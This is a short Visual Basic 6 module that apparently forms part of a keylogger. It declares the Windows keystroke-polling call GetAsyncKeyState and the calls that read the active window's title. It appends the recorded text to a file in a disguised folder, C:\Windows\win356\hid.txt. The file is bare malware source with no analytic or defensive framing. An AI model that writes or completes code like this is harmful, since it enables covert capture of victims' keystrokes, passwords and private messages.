Attribute VB_Name = "Module1"
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function GetForegroundWindow Lib "user32" () As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long


Function savefile(ByVal text As String)
    If Trim(Dir("C:\Windows\win356", vbDirectory)) = "" Then MkDir "C:\Windows\win356"
    Open "C:\Windows\win356\hid.txt" For Append As #1
    Print #1, text
    Close #1
End Function

Function gettitle()
Dim length As Long
Dim sl As Long
Dim s As String

length = GetWindowTextLength(GetForegroundWindow)
s = Space(length + 1)
sl = GetWindowText(GetForegroundWindow, s, length + 1)
s = Left(s, sl)
gettitle = s
End Function

